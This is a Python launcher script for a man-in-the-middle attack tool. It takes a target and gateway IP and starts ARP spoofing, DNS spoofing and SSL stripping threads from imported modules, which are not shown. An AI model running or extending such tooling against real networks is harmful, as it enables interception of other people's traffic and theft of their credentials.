#!/usr/bin/env python3

import argparse
import sys
import threading
from modules.arp_spoof import ARPSpoofer
from modules.dns_spoof import DNSSpoofer
from modules.ssl_strip import SSLStripper

def parse_arguments():
    parser = argparse.ArgumentParser(description='MITM Tool for Educational Purposes')
    parser.add_argument('-i', '--interface', required=True, help='Network interface to use')
    parser.add_argument('-t', '--target', required=True, help='Target IP address')
    parser.add_argument('-g', '--gateway', required=True, help='Gateway IP address')
    parser.add_argument('-p', '--port', type=int, default=8080, help='Port for SSL stripping proxy (default: 8080)')
    parser.add_argument('-m', '--mode', choices=['arp', 'dns', 'ssl', 'all'], 
                      default='all', help='Attack mode to use')
    return parser.parse_args()

def main():
    args = parse_arguments()
    attackers = []
    
    try:
        # Initialize attackers based on mode
        if args.mode in ['arp', 'all']:
            arp_spoofer = ARPSpoofer(args.interface, args.target, args.gateway)
            attackers.append(('ARP Spoofer', arp_spoofer))
            
        if args.mode in ['dns', 'all']:
            dns_spoofer = DNSSpoofer()  # TODO: Implement DNS Spoofing
            attackers.append(('DNS Spoofer', dns_spoofer))
            
        if args.mode in ['ssl', 'all']:
            ssl_stripper = SSLStripper(args.interface, args.port)
            attackers.append(('SSL Stripper', ssl_stripper))

        # Start all attackers in separate threads
        threads = []
        for name, attacker in attackers:
            print(f"[*] Starting {name}...")
            thread = threading.Thread(target=attacker.start)
            thread.daemon = True
            thread.start()
            threads.append((name, thread))
            
        print("\n[+] All attacks started. Press Ctrl+C to stop.")
        
        # Keep the main thread alive
        for _, thread in threads:
            thread.join()
            
    except KeyboardInterrupt:
        print("\n[*] Shutting down MITM tool...")
        # Stop all attackers
        for name, attacker in attackers:
            print(f"[*] Stopping {name}...")
            attacker.stop()
        sys.exit(0)

if __name__ == "__main__":
    main() 